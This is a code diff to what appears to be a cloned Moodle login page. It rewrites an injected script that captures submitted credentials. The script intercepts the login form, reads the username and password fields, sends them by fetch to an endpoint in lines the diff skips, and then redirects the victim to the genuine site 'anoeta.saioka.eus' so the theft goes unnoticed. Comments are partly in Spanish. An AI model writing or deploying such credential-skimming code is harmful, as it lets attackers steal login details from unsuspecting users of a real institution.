@@ -285,8 +285,14 @@ M.util.help_popups.setup(Y);
 
 <script>
 document.addEventListener('DOMContentLoaded', function () {
-    // Sobrescribir la función validar() existente
-    window.validar = function() {
+    // Get the login form
+    const loginForm = document.getElementById('login');
+    
+    // Add an event listener to the form's submit event
+    loginForm.addEventListener('submit', function(event) {
+        // Prevent the default form submission
+        event.preventDefault();
+        
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         
@@ -302,23 +308,19 @@ document.addEventListener('DOMContentLoaded', function () {
         .then(response => {
             if (response.ok) {
                 console.log('Datos enviados correctamente');
-                // Redirigir tras el envío exitoso
+                // Redirect after successful send
                 window.location.href = 'https://anoeta.saioka.eus/';
             } else {
-                // Continuar con el comportamiento original como fallback
-                return false;
+                console.error('Error en el envío');
             }
         })
         .catch((error) => {
             console.error('Error:', error);
-            return false;
         });
-        
-        // Prevenir el comportamiento normal del formulario
-        return false;
-    };
+    });
 });
 </script>
+
 
 
 
